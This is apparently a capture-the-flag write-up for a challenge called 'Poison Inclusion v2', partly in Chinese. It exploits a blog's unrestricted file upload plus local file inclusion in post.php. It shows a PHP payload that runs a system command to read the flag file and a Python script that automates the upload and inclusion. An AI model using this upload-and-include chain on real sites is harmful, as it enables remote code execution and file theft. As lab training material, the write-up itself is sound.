# X-028-24 Poison Inclusion v2

> You've discovered a personal blog site that initially had a serious security oversight with an LFI vulnerability. After detecting the intrusion, the developer implemented new protections, but you managed to bypass them. Now, after two failed attempts, the developer has implemented the most robust security measures recommended by a friend. Your mission is to bypass these new, fortified defenses, exploit the LFI vulnerability, and uncover the hidden flag.

- 首页有“Submit your article/投稿”入口，进入后发现可以上传任意文件（未见扩展名/类型限制）。
- 站点有文章详情页形如：`/post.php?id=SomeName`，疑似从某固定目录按文件名拼接加载文章。
- 假设上传目录位于文章目录下：若能上传 `uploads/p.php`，再访问 `post.php?id=uploads/p`，若服务端会在固定目录拼接并附加`.php`后缀进行 include，则可执行我们上传的 PHP 代码。

首先创建一个 `p.php`：
```php
<?php system("cat /FLAG.txt"); ?>
```
   打开上传页：`/posts/upload-article.php`，上传成功后，访问：`/post.php?id=uploads/p`，页面正文位置可直接看到 flag。
   ![image.png](https://x/x12100822875.png)
## EXP
```python
import re
import requests

base = "http://ip32791"
sess = requests.Session()

payload = '<?php system("cat /FLAG.txt"); ?>'
files = {"articleFile": ("p.php", payload, "application/x-php")}
data = {"name": "a", "email": "a@a.com"}
sess.post(base + "/posts/upload-article.php", files=files, data=data)

r = sess.get(base + "/post.php?id=uploads/p")
text = r.text

m = re.search(r"FLAG\{[^}]+\}", text)
print(m.group(0))
```